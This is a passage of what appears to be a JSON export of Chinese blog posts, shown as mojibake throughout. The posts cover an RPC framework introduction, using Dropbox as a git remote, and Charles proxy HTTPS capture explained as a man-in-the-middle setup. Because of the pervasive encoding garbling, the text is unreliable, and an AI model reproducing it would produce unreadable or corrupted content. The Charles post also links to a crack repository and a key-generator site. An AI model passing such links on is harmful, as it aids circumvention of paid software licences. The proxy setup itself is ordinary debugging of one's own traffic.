å°„ï¼šå¯ä»¥ç›´æ¥ä½¿ç”¨å‡½æ•°å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ•´æ•° IDã€‚æ˜ å°„è¡¨ä¸€èˆ¬å°±æ˜¯ä¸€ä¸ªå“ˆå¸Œè¡¨ã€‚\n\n- æ•°æ®æµçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼šå¯ä»¥è‡ªå·±å†™ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Protobuf æˆ–è€… FlatBuffers ä¹‹ç±»çš„ã€‚\n\n- ç½‘ç»œä¼ è¾“ï¼šå°½ç®¡å¤§éƒ¨åˆ† RPC æ¡†æ¶éƒ½ä½¿ç”¨ TCP åè®®ï¼Œä½†å…¶å® UDP ä¹Ÿå¯ä»¥ï¼Œè€Œ gRPC å¹²è„†å°±ç”¨äº† HTTP2ã€‚ä¹Ÿå¯ä»¥è‡ªå·±å†™ Socketï¼Œæˆ–è€…ç”¨ Asioï¼ŒZeroMQï¼ŒNetty ä¹‹ç±»ã€‚\n\n  \n\n##### 1.3.1 æœåŠ¡å¯»å€\n\næœåŠ¡å¯»å€å¯ä»¥ä½¿ç”¨ Call ID æ˜ å°„ã€‚åœ¨æœ¬åœ°è°ƒç”¨ä¸­ï¼Œå‡½æ•°ä½“æ˜¯ç›´æ¥é€šè¿‡å‡½æ•°æŒ‡é’ˆæ¥æŒ‡å®šçš„ï¼Œä½†æ˜¯åœ¨è¿œç¨‹è°ƒç”¨ä¸­ï¼Œå‡½æ•°æŒ‡é’ˆæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸ºä¸¤ä¸ªè¿›ç¨‹çš„åœ°å€ç©ºé—´æ˜¯å®Œå…¨ä¸ä¸€æ ·çš„ã€‚\n\næ‰€ä»¥åœ¨ RPC ä¸­ï¼Œæ‰€æœ‰çš„å‡½æ•°éƒ½å¿…é¡»æœ‰è‡ªå·±çš„ä¸€ä¸ª IDã€‚è¿™ä¸ª ID åœ¨æ‰€æœ‰è¿›ç¨‹ä¸­éƒ½æ˜¯å”¯ä¸€ç¡®å®šçš„ã€‚å®¢æˆ·ç«¯åœ¨åšè¿œç¨‹è¿‡ç¨‹è°ƒç”¨æ—¶ï¼Œå¿…é¡»é™„ä¸Šè¿™ä¸ª IDã€‚ç„¶åæˆ‘ä»¬è¿˜éœ€è¦åœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯åˆ†åˆ«ç»´æŠ¤ä¸€ä¸ªå‡½æ•°å’ŒCall IDçš„å¯¹åº”è¡¨ã€‚\n\nå½“å®¢æˆ·ç«¯éœ€è¦è¿›è¡Œè¿œç¨‹è°ƒç”¨æ—¶ï¼Œå®ƒå°±æŸ¥ä¸€ä¸‹è¿™ä¸ªè¡¨ï¼Œæ‰¾å‡ºç›¸åº”çš„ Call IDï¼Œç„¶åæŠŠå®ƒä¼ ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯ä¹Ÿé€šè¿‡æŸ¥è¡¨ï¼Œæ¥ç¡®å®šå®¢æˆ·ç«¯éœ€è¦è°ƒç”¨çš„å‡½æ•°ï¼Œç„¶åæ‰§è¡Œç›¸åº”å‡½æ•°çš„ä»£ç ã€‚\n\n> å®ç°æ–¹å¼ï¼šæœåŠ¡æ³¨å†Œä¸­å¿ƒã€‚\n\nè¦è°ƒç”¨æœåŠ¡ï¼Œé¦–å…ˆä½ éœ€è¦ä¸€ä¸ªæœåŠ¡æ³¨å†Œä¸­å¿ƒå»æŸ¥è¯¢å¯¹æ–¹æœåŠ¡éƒ½æœ‰å“ªäº›å®ä¾‹ã€‚Dubbo çš„æœåŠ¡æ³¨å†Œä¸­å¿ƒæ˜¯å¯ä»¥é…ç½®çš„ï¼Œå®˜æ–¹æ¨èä½¿ç”¨ Zookeeperã€‚\n\nå®ç°æ¡ˆä¾‹ï¼šRMI(Remote Method Invocationï¼Œè¿œç¨‹æ–¹æ³•è°ƒç”¨)ä¹Ÿå°±æ˜¯ RPC æœ¬èº«çš„å®ç°æ–¹å¼ã€‚\n\n![1](rpcçš„ä»‹ç»/2.jpg)\n\n\n\nRegistry(æœåŠ¡å‘ç°)ï¼šå€ŸåŠ© JNDI å‘å¸ƒå¹¶è°ƒç”¨äº† RMI æœåŠ¡ã€‚å®é™…ä¸Šï¼ŒJNDI å°±æ˜¯ä¸€ä¸ªæ³¨å†Œè¡¨ï¼ŒæœåŠ¡ç«¯å°†æœåŠ¡å¯¹è±¡æ”¾å…¥åˆ°æ³¨å†Œè¡¨ä¸­ï¼Œå®¢æˆ·ç«¯ä»æ³¨å†Œè¡¨ä¸­è·å–æœåŠ¡å¯¹è±¡ã€‚\n\nRMI æœåŠ¡åœ¨æœåŠ¡ç«¯å®ç°ä¹‹åéœ€è¦æ³¨å†Œåˆ° RMI Server ä¸Šï¼Œç„¶åå®¢æˆ·ç«¯ä»æŒ‡å®šçš„ RMI åœ°å€ä¸Š Lookup æœåŠ¡ï¼Œè°ƒç”¨è¯¥æœåŠ¡å¯¹åº”çš„æ–¹æ³•å³å¯å®Œæˆè¿œç¨‹æ–¹æ³•è°ƒç”¨ã€‚\n\nRegistry æ˜¯ä¸ªå¾ˆé‡è¦çš„åŠŸèƒ½ï¼Œå½“æœåŠ¡ç«¯å¼€å‘å®ŒæœåŠ¡ä¹‹åï¼Œè¦å¯¹å¤–æš´éœ²ï¼Œå¦‚æœæ²¡æœ‰æœåŠ¡æ³¨å†Œï¼Œåˆ™å®¢æˆ·ç«¯æ˜¯æ— ä»è°ƒç”¨çš„ï¼Œå³ä½¿æœåŠ¡ç«¯çš„æœåŠ¡å°±åœ¨é‚£é‡Œã€‚\n\n\n\n##### 1.3.2 åºåˆ—åŒ–å’Œååºåˆ—åŒ–\n\nå®¢æˆ·ç«¯æ€ä¹ˆæŠŠå‚æ•°å€¼ä¼ ç»™è¿œç¨‹çš„å‡½æ•°å‘¢?åœ¨æœ¬åœ°è°ƒç”¨ä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠå‚æ•°å‹åˆ°æ ˆé‡Œï¼Œç„¶åè®©å‡½æ•°è‡ªå·±å»æ ˆé‡Œè¯»å°±è¡Œã€‚\n\nä½†æ˜¯åœ¨è¿œç¨‹è¿‡ç¨‹è°ƒç”¨æ—¶ï¼Œå®¢æˆ·ç«¯è·ŸæœåŠ¡ç«¯æ˜¯ä¸åŒçš„è¿›ç¨‹ï¼Œä¸èƒ½é€šè¿‡å†…å­˜æ¥ä¼ é€’å‚æ•°ã€‚è¿™æ—¶å€™å°±éœ€è¦å®¢æˆ·ç«¯æŠŠå‚æ•°å…ˆè½¬æˆä¸€ä¸ªå­—èŠ‚æµï¼Œä¼ ç»™æœåŠ¡ç«¯åï¼Œå†æŠŠå­—èŠ‚æµè½¬æˆè‡ªå·±èƒ½è¯»å–çš„æ ¼å¼ã€‚\n\nåªæœ‰äºŒè¿›åˆ¶æ•°æ®æ‰èƒ½åœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„å®šä¹‰æ˜¯ï¼š\n\n- å°†å¯¹è±¡è½¬æ¢æˆäºŒè¿›åˆ¶æµçš„è¿‡ç¨‹å«åšåºåˆ—åŒ–\n- å°†äºŒè¿›åˆ¶æµè½¬æ¢æˆå¯¹è±¡çš„è¿‡ç¨‹å«åšååºåˆ—åŒ–\n\nè¿™ä¸ªè¿‡ç¨‹å«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚åŒç†ï¼Œä»æœåŠ¡ç«¯è¿”å›çš„å€¼ä¹Ÿéœ€è¦åºåˆ—åŒ–ååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚\n\n\n\n##### 1.3.3 ç½‘ç»œä¼ è¾“\n\nç½‘ç»œä¼ è¾“ï¼šè¿œç¨‹è°ƒç”¨å¾€å¾€ç”¨åœ¨ç½‘ç»œä¸Šï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ˜¯é€šè¿‡ç½‘ç»œè¿æ¥çš„ã€‚\n\næ‰€æœ‰çš„æ•°æ®éƒ½éœ€è¦é€šè¿‡ç½‘ç»œä¼ è¾“ï¼Œå› æ­¤å°±éœ€è¦æœ‰ä¸€ä¸ªç½‘ç»œä¼ è¾“å±‚ã€‚ç½‘ç»œä¼ è¾“å±‚éœ€è¦æŠŠ Call ID å’Œåºåˆ—åŒ–åçš„å‚æ•°å­—èŠ‚æµä¼ ç»™æœåŠ¡ç«¯ï¼Œç„¶åå†æŠŠåºåˆ—åŒ–åçš„è°ƒç”¨ç»“æœä¼ å›å®¢æˆ·ç«¯ã€‚\n\nåªè¦èƒ½å®Œæˆè¿™ä¸¤è€…çš„ï¼Œéƒ½å¯ä»¥ä½œä¸ºä¼ è¾“å±‚ä½¿ç”¨ã€‚å› æ­¤ï¼Œå®ƒæ‰€ä½¿ç”¨çš„åè®®å…¶å®æ˜¯ä¸é™çš„ï¼Œèƒ½å®Œæˆä¼ è¾“å°±è¡Œã€‚\n\nå°½ç®¡å¤§éƒ¨åˆ† RPC æ¡†æ¶éƒ½ä½¿ç”¨ TCP åè®®ï¼Œä½†å…¶å® UDP ä¹Ÿå¯ä»¥ï¼Œè€Œ gRPC å¹²è„†å°±ç”¨äº† HTTP2ã€‚\n\nTCP çš„è¿æ¥æ˜¯æœ€å¸¸è§çš„ï¼Œç®€è¦åˆ†æåŸºäº TCP çš„è¿æ¥ï¼šé€šå¸¸ TCP è¿æ¥å¯ä»¥æ˜¯æŒ‰éœ€è¿æ¥(éœ€è¦è°ƒç”¨çš„æ—¶å€™å°±å…ˆå»ºç«‹è¿æ¥ï¼Œè°ƒç”¨ç»“æŸåå°±ç«‹é©¬æ–­æ‰)ï¼Œä¹Ÿå¯ä»¥æ˜¯é•¿è¿æ¥(å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å»ºç«‹èµ·è¿æ¥ä¹‹åä¿æŒé•¿æœŸæŒæœ‰ï¼Œä¸ç®¡æ­¤æ—¶æœ‰æ— æ•°æ®åŒ…çš„å‘é€ï¼Œå¯ä»¥é…åˆå¿ƒè·³æ£€æµ‹æœºåˆ¶å®šæœŸæ£€æµ‹å»ºç«‹çš„è¿æ¥æ˜¯å¦å­˜æ´»æœ‰æ•ˆ)ï¼Œå¤šä¸ªè¿œç¨‹è¿‡ç¨‹è°ƒç”¨å…±äº«åŒä¸€ä¸ªè¿æ¥ã€‚\n\n\n\n# 2. é—®é¢˜æ€»ç»“\n\n### 2.1 RPC å’Œ HTTP åŒºåˆ«\n\n+ HTTPå’ŒRPCåŒä¸€çº§åˆ«ï¼Œè¿˜æ˜¯è¢«RPCåŒ…å«ï¼Ÿ\n\n  \n\n  ![1](rpcçš„ä»‹ç»/3.jpg)\n\n  ä¸Šå›¾æ˜¯ä¸€ä¸ªæ¯”è¾ƒå®Œæ•´çš„å…³ç³»å›¾ï¼Œè¿™æ—¶æˆ‘ä»¬å‘ç°HTTPï¼ˆå›¾ä¸­è“è‰²æ¡†ï¼‰å‡ºç°äº†ä¸¤æ¬¡ã€‚å…¶ä¸­ä¸€ä¸ªæ˜¯å’ŒRPCå¹¶åˆ—çš„ï¼Œéƒ½æ˜¯è·¨åº”ç”¨è°ƒç”¨æ–¹æ³•çš„è§£å†³æ–¹æ¡ˆï¼›å¦ä¸€ä¸ªåˆ™æ˜¯è¢«RPCåŒ…å«çš„ï¼Œæ˜¯RPCé€šä¿¡è¿‡ç¨‹çš„å¯é€‰åè®®ä¹‹ä¸€ã€‚\n\n  å› æ­¤ï¼Œ**é—®é¢˜çš„ç­”æ¡ˆæ˜¯éƒ½å¯¹ã€‚çœ‹æŒ‡çš„æ˜¯å“ªä¸€ä¸ªè“è‰²æ¡†ã€‚**\n\n\n\n+ Restfulä¹Ÿå±äºRPCä¹ˆï¼Ÿ\n\n  ç¬¬äºŒä¸ªé—®é¢˜æ˜¯åœ¨é—®è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆçº¢è‰²æ¡†ï¼‰æ˜¯ä¸æ˜¯åŒ…å«äº†Restfulï¼ˆé»„è‰²æ¡†ï¼‰ï¼Œè¿™ç§ç†è§£çš„å…³é”®åœ¨äºå¯¹RPCçš„ç†è§£ã€‚\n\n  RPCå­—é¢ç†è§£æ˜¯è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼Œå³åœ¨ä¸€ä¸ªåº”ç”¨ä¸­è°ƒç”¨å¦ä¸€ä¸ªåº”ç”¨çš„æ–¹æ³•ã€‚é‚£Restfulæ˜¯æ»¡è¶³çš„ï¼Œé€šè¿‡å®ƒå¯ä»¥å®ç°åœ¨ä¸€ä¸ªåº”ç”¨ä¸­è°ƒç”¨å¦ä¸€ä¸ªåº”ç”¨çš„æ–¹æ³•ã€‚\n\n  ä½†æ˜¯ï¼Œä¸Šè¿°ç†è§£ä½¿å¾—RPCçš„å®šä¹‰è¿‡äºå®½æ³›ã€‚RPCé€šå¸¸ç‰¹æŒ‡åœ¨ä¸€ä¸ªåº”ç”¨ä¸­è°ƒç”¨å¦ä¸€ä¸ªåº”ç”¨çš„æ¥å£è€Œå®ç°çš„è¿œç¨‹è°ƒç”¨ï¼Œå³çº¢è‰²æ¡†æ‰€æŒ‡çš„èŒƒå›´ã€‚è¿™æ ·ï¼ŒRPCæ˜¯ä¸åŒ…å«Restfulçš„ã€‚\n\n  \n\n# 3. å‚è€ƒèµ„æ–™\n\n+ [èŠ±äº†ä¸€ä¸ªæ˜ŸæœŸï¼Œæˆ‘ç»ˆäºæŠŠRPCæ¡†æ¶æ•´æ˜ç™½äº†ï¼](https://developer.51cto.com/art/201906/597963.htm)\n\n","tags":["rpc"],"categories":["rpc"]},{"title":"dropboxçš„ä½¿ç”¨æŠ€å·§","url":"%2Fp%2Fd13034b1.html","content":"\næ²¡æœ‰æ¯”æ•°æ®å®‰å…¨æ›´é‡è¦çš„èŠ±è´¹äº†ï¼Œä¸€å¹´100åˆ€ï¼Œä¹Ÿå€¼ï¼\n\n<!-- more -->\n\n# 1. dropboxè®¾ç½®ä¸º gitè¿œç¨‹ä»“åº“\n\n### 1.1 git bareã€ä¸å®‰å…¨ã€‘\n\n```bash\n~/project $ git init\n~/project $ git add .\n~/project $ git commit -m \"first commit\"\n~/project $ cd ~/Dropbox/git\n\n~/Dropbox/git $ git init --bare bare.git\n~/Dropbox/git $ cd ~/project\n\n~/project $ git remote add origin ~/Dropbox/git/bare.git\n~/project $ git push -u origin master\n```\n\nå¦å¤–ä¸€ä¸ªç”µè„‘æ“ä½œ\n\n```bash\ngit clone ~/Dropbox/git/bare.git project2\n```\n\n<img src=\"dropbox%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/iShot_2023-02-10_16.47.54.jpg\" alt=\"iShot_2023-02-10_16.47.54\" style=\"zoom: 50%;\" />\n\n### 1.2 git-remote-dropbox\n\né¡¹ç›®ï¼š https://github.com/anishathalye/git-remote-dropbox\n\n+ å®‰è£…\n\n  ```bash\n  pip3 install git-remote-dropbox\n  export PATH=${HOME}/Library/Python/3.8/bin:$PATH\n  ```\n\n+ ç™»å½•\n\n  ```bash\n  git dropbox login\n  \n  # è¾“å…¥å¯†é’¥\n  Successfully logged in! You can now add Dropbox remotes like 'dropbox:///path/to/repo'\n  ```\n\n+ æ“ä½œ\n\n  ç¬¬ä¸€ä¸ªç”µè„‘\n\n  ```bash\n  git remote rm origin\n  \n  git remote add origin \"dropbox:///5_Git/project.git\"\n  git push --set-upstream origin main\n  ```\n\n  <img src=\"dropbox%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20230210163122063.png\" alt=\"image-20230210163122063\" style=\"zoom:50%;\" />\n\nâ€‹\tç¬¬äºŒä¸ªç”µè„‘\n  ```bash\n  git clone  \"dropbox:///5_Git/project.git\" project2\n  ```\n\n+ è¿˜åŸæ•°æ®\n\n  ```bash\n  mkdir new && cd new \n  git init\n  \n  rm -rf .git/{refs,objects} && cp -r ~/Dropbox/5_Git/project.git/{refs,objects} .git/\n  git checkout -f main\n  ```\n\n  <img src=\"dropbox%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20230210170204297.png\" alt=\"image-20230210170204297\" style=\"zoom: 50%;\" />\n\n\n\n# 2. git å’Œ dropboxçš„ç»“åˆ\n\nç›®å‰é‡‡å–å±é™©æ–¹æ¡ˆï¼ŒæŠŠ .git æ–‡ä»¶å¤¹ åŒæ­¥åˆ° dropboxé‡Œé¢ã€‚\n\n\n\n\n# 3. æœ¬åœ°æ–‡ä»¶å¤¹åŒæ­¥dropboxã€åºŸå¼ƒã€‘\n\nè¿˜æ˜¯æ‰“å¼€Macçš„ä¸‹è½½æ–‡ä»¶å¤¹åŒæ­¥ï¼Œç®€ç›´ä¸è¦å¤ªå¥½ç”¨ã€‚å¦å¤–å¯ä»¥ä»¿ç…§MacåŒæ­¥ï¼ŒåŠ å…¥ç”µè„‘ä¸‹å…¶ä»–æ–‡ä»¶å¤¹ã€‚\n\n```bash\nln -s /Users/liuwei/Dropbox/Mac/workspace ~/workspace\nchmod -h 700 ~/workspace\nchflags -h uchg ~/workspace\n```\n\n\n\n","tags":["dropbox"],"categories":["è½¯ä»¶"]},{"title":"CharlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®","url":"%2Fp%2F2a640eb1.html","content":"\n\n\n# 1. Charles è½¯ä»¶ç ´è§£\n\nhttps://github.com/8enet/Charles-Crack\n\nhttps://www.zzzmode.com/mytools/charles/\n\nå‘ç°ä¸€ä¸ªæ›´å¥½ç”¨çš„æŠ“åŒ…è½¯ä»¶, å…è´¹\n\nhttps://github.com/ProxymanApp/Proxyman\n\n\n\n# 2. Charles Mac ChromeæŠ“åŒ…\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒChrome å’Œ Firefox æµè§ˆå™¨é»˜è®¤å¹¶ä¸ä½¿ç”¨ç³»ç»Ÿçš„ä»£ç†æœåŠ¡å™¨è®¾ç½®ï¼Œè€Œ Charles æ˜¯é€šè¿‡å°†è‡ªå·±è®¾ç½®æˆä»£ç†æœåŠ¡å™¨æ¥å®Œæˆå°åŒ…æˆªå–çš„ï¼Œæ‰€ä»¥åœ¨é»˜è®¤æƒ…å†µä¸‹æ— æ³•æˆªå– Chrome å’Œ Firefox æµè§ˆå™¨çš„ç½‘ç»œé€šè®¯å†…å®¹ã€‚\n\n1. è®¿é—®: chrome://settings/   \n2. ç„¶åä¸‹æ‹‰åˆ°æœ€åçš„é«˜çº§ï¼Œä¸‹æ¥åœ¨â€œç³»ç»Ÿâ€ï¼ˆå€’æ•°ç¬¬äºŒä¸ªï¼‰çš„æ¡ç›®ä¸‹æ‰¾åˆ°â€œæ‰“å¼€ä»£ç†è®¾ç½®â€ï¼Œç„¶ååŒå‡»æ‰“å¼€ä¹‹åï¼Œæ‰“å¼€ä¹‹åæ‰¾åˆ°ä»£ç†çš„tabç‚¹å¼€ï¼Œç‚¹å¼€ä¹‹åå¯ä»¥çœ‹åˆ°è¯·é€‰æ‹©ä¸€ä¸ªåè®®è¿›è¡Œé…ç½®ï¼Œè¿™ä¸ªæ—¶å€™æ‰¾åˆ°â€œç½‘é¡µä»£ç†(http)â€å’Œâ€œå®‰å…¨ç½‘é¡µä»£ç†(https)â€ï¼Œè¿›è¡Œç›¸åº”çš„é…ç½®å°±å¯ä»¥äº†ï¼Œä¸€èˆ¬æ¥è¯´è‡ªå·±ä¸åšå…¶ä»–å¤„ç†ï¼Œç›´æ¥é…ç½®ä»£ç†æœåŠ¡å™¨ä¸ºâ€œ127.0.0.1â€ï¼Œç«¯å£(å°±æ˜¯å†’å·:)åæ˜¯â€œ8888â€ã€‚\n3. å¦‚ä½•æŠ“httpsç½‘ç«™, åœ¨charleså·¦ä¾§è¯¥ç½‘å€å³é”® Enable SSL Proxying\n\n<!-- more -->\n\n# 3. Charles æ‰‹æœº HttpsæŠ“åŒ…\n\n### 3.1 å®‰è£…ç”µè„‘ç«¯è¯ä¹¦  \n\nåœ¨`Help`èœå•ä¸‹çš„è·¯å¾„,ä¸‹è½½æ ¹è¯ä¹¦,å¹¶ä¸”åœ¨`é’¥åŒ™ä¸²`é‡Œè®¾ç½®ä¿¡ä»»æ­¤è¯ä¹¦.\n\n<img src=\"charlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/1.png\" alt=\"1\" style=\"zoom:50%;\" />\n<img src=\"charlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/2.png\" alt=\"2\" style=\"zoom:50%;\" />\n\n\n\n### 3.2 å®‰è£…æ‰‹æœºè¯ä¹¦\n\n<img src=\"charlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/3.png\" alt=\"3\" style=\"zoom:50%;\" />\n\n\nåœ¨ç›¸å…³çš„æ‰‹æœºä¸­æ‰“å¼€`Safari`,è¾“å…¥ä¸‹å›¾ä¸­é»˜è®¤çš„åœ°å€`chls.pro/ssl`ï¼Œæ‰‹æœºä¼šè‡ªåŠ¨è·³è½¬åˆ°è¯ä¹¦ä¸‹è½½ç•Œé¢ï¼ŒæŒ‰ç…§æç¤ºå®‰è£…å³å¯.\n\nå®‰è£…å,è®¾ç½®ä¿¡ä»»æ­¤è¯ä¹¦.\n<img src=\"charlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/4.png\" alt=\"4\" style=\"zoom:50%;\" />\n\n\n\n### 3.3 é…ç½®æ‰‹æœºWifiä»£ç†å’Œå¼€å¯Charles SSL Proxy\n\n<img src=\"charlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/5.png\" alt=\"5\" style=\"zoom:50%;\" />\n<img src=\"charlesæŠ“åŒ…å·¥å…·ç ´è§£ä½¿ç”¨å’ŒHttpsé…ç½®/6.png\" alt=\"6\" style=\"zoom:50%;\" />\n\n\n\næœ€æ–°ç³»ç»Ÿå¤šäº†ä¸€é“ç¨‹åº:\n\n+ éœ€è¦åœ¨å…³äºæœ¬æœº->è¯ä¹¦ä¿¡ä»»è®¾ç½®->å†æ¬¡ä¿¡ä»»ä¸€ä¸‹è¯ä¹¦\n\n\n\n# 4. Charleså¯ä»¥æŠ“å–httpsæŠ¥æ–‡çš„åŸç†\n\nåŸç†å°±æ˜¯: **ä¸­é—´äººæ”»å‡»**\n\n> Charles ä½œä¸ºä¸€ä¸ªä¸­é—´äººæ¥è¿›è¡Œ HTTPS çš„ä»£ç†ï¼Œè®©æˆ‘ä»¬æ£€æµ‹åˆ°æµè§ˆå™¨å’Œ SSL web æœåŠ¡ç«¯ä¹‹é—´çš„æ˜æ–‡é€šä¿¡ã€‚\n>  Charles æŠŠè‡ªå·±å˜æˆä¸€ä¸ªä¸­é—´äººæ¥è¾¾åˆ°è¿™ä¸€ç›®çš„ã€‚ä½ çš„æµè§ˆå™¨æ˜¯æ”¶ä¸åˆ°æœåŠ¡ç«¯è¯ä¹¦çš„ï¼ŒCharles ä¼šç”¨è‡ªå·±çš„æ ¹è¯ä¹¦åŠ¨æ€ç­¾å‘ä¸€å¼ è¯ä¹¦ï¼Œç„¶å Charles æ¥æ¥å—æœåŠ¡ç«¯çš„è¯ä¹¦ï¼Œä½ çš„æµè§ˆå™¨æ¥å— Charles çš„è¯ä¹¦ã€‚\n>  â€¦\n>  Charles ä»ç„¶é€šè¿‡ SSL ä¸æœåŠ¡ç«¯è¿›è¡Œé€šä¿¡ï¼Œä½†é€šä¿¡æ˜¯é€šè¿‡æµè§ˆå™¨åˆ° Charlesï¼Œç„¶ååœ¨ä» Charles åˆ°æœåŠ¡å™¨ã€‚\n\né€šä¿—ç‰ˆSSLåè®®åŸç†:\n\n- å°æ˜å’Œå°ç‹æ˜¯ä¸€å¯¹å¥½åŸºå‹ï¼Œä½†æ˜¯è¿œéš”ä¸‡æ°´åƒå±±ï¼Œåªèƒ½é€šè¿‡å†™ä¿¡æ¥ä¼ é€’æ¶ˆæ¯ã€‚ä¿©äººæ¯å¤©çš„ä¿¡ä»¶éƒ½æ˜¯é€šè¿‡é‚®é€’å‘˜å°çº¢æ¥ä¼ é€’çš„ï¼Œè¿™ä¿©äººæ¯å¤©çº¸æ¡ä¸Šæ˜æ–‡å†™ç€ä¿¡æ¯ï¼Œå°çº¢ä¹Ÿå¤©å¤©çœ‹çš„ä¸äº¦ä¹ä¹ï¼Œè¿™å°±æ˜¯ HTTPã€‚\n- æ—¶é—´ä¹…äº†ï¼Œä¸¤äººå‘ç°ä¸è¡Œï¼Œæ¯”å¦‚æœ‰æ—¶å€™ä¼šä¼ é€’ä¸€äº›ä¸å’Œè°çš„å†…å®¹ï¼Œä¸å¸Œæœ›å°çº¢è¿™æ ·çš„è…å¥³çœ‹åˆ°ï¼›äºæ˜¯å°æ˜çµæœºä¸€åŠ¨ï¼Œæ¢æˆè‘¬çˆ±å®¶æ—çš„æ€é©¬ç‰¹ç«æ˜Ÿæ–‡æ¥è¿›è¡Œé€šä¿¡ï¼›å°ç‹çœ‹åï¼Œå¿ƒé¢†ç¥ä¼šã€‚ç”±äºè½¬æ¢æ–¹å¼ä¸¤äººéƒ½çŸ¥é“ï¼Œè¿™å°±æ˜¯å¯¹ç§°åŠ å¯†æŠ€æœ¯ã€‚\n- ç„¶è€Œå¥½æ™¯ä¸é•¿ï¼Œå°çº¢å‹¤å­¦è‹¦ç»ƒï¼Œç»ˆäºç»ƒæˆäº†ç«æ˜Ÿæ–‡åçº§ï¼Œåˆèƒ½çœ‹æ‡‚ä¿©äººåŠ å¯†çš„å†…å®¹äº†ã€‚ä¿©äººå¿…é¡»è¦æ›´æ¢åŠ å¯†æ–¹å¼ï¼Œä½†æ˜¯æ›´æ¢çš„åŠ å¯†æ–¹å¼ä¹Ÿåªèƒ½é€šè¿‡å°çº¢æ¥ä¼ é€’ï¼Œæ‰€ä»¥è¿™ä¸ªåŠ å¯†çš„æ‰‹æ®µå¾ˆéš¾ç’ä½å°çº¢ï¼Œè¿™å°±æ˜¯ HTTP çš„ä¸å®‰å…¨æ€§ã€‚\n- æ­£å¥½å°æ˜æ˜¯ä¸€ä½åšå­¦çš„å“²â™‚å­¦å®¶ï¼Œä»–ç«‹åˆ»å†™äº†å°ä¿¡ç»™å°ç‹ï¼šæŠŠä½ å®¶å‚¨ç‰©é—´ç®±å­çš„ä¸Šé‚£æŠŠæŒ‚é”å¯„è¿‡æ¥ï¼å°ç‹çœ‹åç«‹åˆ»æ‹¿å‡ºäº†é‚£æŠŠ 82 å¹´çš„æŒ‚é”ï¼ŒæŠŠå®ƒæ‰“å¼€å¹¶å¯„ç»™äº†å°æ˜ã€‚è¿™ä¸ªé”å¤§å®¶éƒ½èƒ½çœ‹åˆ°ï¼Œä½†åªæœ‰å°ç‹æœ‰é’¥åŒ™ï¼Œè¿™å°±æ˜¯ä¼ è¯´ä¸­çš„éå¯¹ç§°åŠ å¯†ï¼Œé”å°±æ˜¯å…¬é’¥ï¼Œå°ç‹çš„é’¥åŒ™å°±æ˜¯ç§é’¥ã€‚\n- å°æ˜æ”¶åˆ°åï¼Œä»”ç»†ç ”ç©¶äº†é‚£æŠŠé”ï¼Œä¸Šé¢çƒ«ç€ã€éš”å£è€ç‹ã€å››ä¸ªéé‡‘å¤§å­—ï¼Œæ­£æ˜¯ç‹å®¶ç¥–ä¼ çš„é”ï¼Œè¿™å°±æ˜¯éªŒè¯æœåŠ¡ç«¯çš„æ•°å­—è¯ä¹¦ã€‚\n   äºæ˜¯å°æ˜æ”¾å¿ƒçš„æŠŠæ–°çš„åŠ å¯†æ–¹å¼å†™åœ¨ä¿¡ä¸­ï¼Œæ”¾åˆ°ç›’å­é‡Œï¼Œç„¶åç”¨é”é”ä¸Šã€‚ç”±äºå°çº¢æ²¡æœ‰é’¥åŒ™ï¼Œæ²¡æ³•æŸ¥çœ‹ç›’å­é‡Œåˆ°åº•å†™äº†å•¥ï¼Œåªèƒ½åŸæ ·é€è¿‡å»ã€‚å°ç‹æ”¶åˆ°åï¼Œç”¨è‡ªå·±çš„é’¥åŒ™æ‰“å¼€äº†é”ï¼Œè·å¾—äº†æ–°çš„åŠ å¯†æ–¹å¼ã€‚è¿™å°±å®Œæˆäº† SSL åè®®çš„æ¡æ‰‹ã€‚\n\nåˆ©ç”¨Charlesä¹‹åçš„åœºæ™¯:\n\n- å°çº¢æ‹¿åˆ°é”ä»¥åï¼Œå…ˆæ‰£ç€ä¸å‘ï¼Œç„¶åæå‡ºäº†è‡ªå·±çš„é”å¯„ç»™å°æ˜ï¼Œè¿™å°±æ˜¯ Charles ç­¾å‘äº†è‡ªå·±æ ¹è¯ä¹¦ï¼›\n- å°æ˜ä¸€çœ‹è¿™æŠŠé”ä¸æ˜¯æ­£å®—ç‹å®¶çš„ï¼Œä½†æ˜¯å°çº¢å®¶çš„é”ï¼Œä¼¼ä¹ä¹Ÿå¯ä»¥ç›¸ä¿¡ï¼Œè¿™å°±æ˜¯ä¿¡ä»»äº† Charles çš„æ ¹è¯ä¹¦ï¼›\n- å°æ˜æŠŠåŠ å¯†æ–¹å¼å†™è¿›å»ï¼Œç„¶åç”¨å°çº¢çš„é”é”èµ·æ¥äº†ï¼Œå°çº¢æ‰“å¼€ä¹‹åç ”ç©¶äº†åŠ 